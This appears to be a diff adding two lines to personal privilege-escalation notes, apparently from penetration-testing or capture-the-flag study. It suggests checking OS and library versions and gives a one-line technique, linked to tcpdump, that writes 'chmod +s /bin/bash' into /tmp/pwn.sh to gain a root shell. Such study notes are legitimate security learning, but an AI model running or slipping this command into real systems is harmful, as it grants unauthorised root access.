@@ -1,0 +1,3 @@
+- Check version of Things. OS, libraries ... 
+
+- if you have execute permissions as root, you can do as this [[tcpdump]]. which is `echo 'chmod +s /bin/bash' > /tmp/pwn.sh`.
